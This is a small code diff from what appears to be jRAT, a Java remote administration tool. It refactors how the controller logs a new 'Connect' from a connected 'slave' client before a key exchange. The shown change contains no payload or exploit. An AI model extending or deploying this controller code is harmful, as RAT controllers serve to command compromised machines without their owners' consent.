@@ -23,7 +23,6 @@ import se.jrat.client.net.ServerListener;
 import se.jrat.client.settings.CountryStatistics;
 import se.jrat.client.settings.CustomID;
 import se.jrat.client.settings.Settings;
-import se.jrat.client.ui.panels.PanelMainLog;
 import se.jrat.client.utils.FlagUtils;
 import se.jrat.common.Version;
 import se.jrat.common.codec.Hex;
@@ -114,7 +113,7 @@ public abstract class AbstractSlave implements Runnable {
 			this.country = "?";
 		}
 
-		PanelMainLog.getInstance().addEntry("Connect", this, "");
+		Main.instance.getPanelLog().addEntry("Connect", this, "");
 		
 		KeyExchanger exchanger = new KeyExchanger(dis, dos, GlobalKeyPair.getKeyPair());
 		exchanger.writePublicKey();
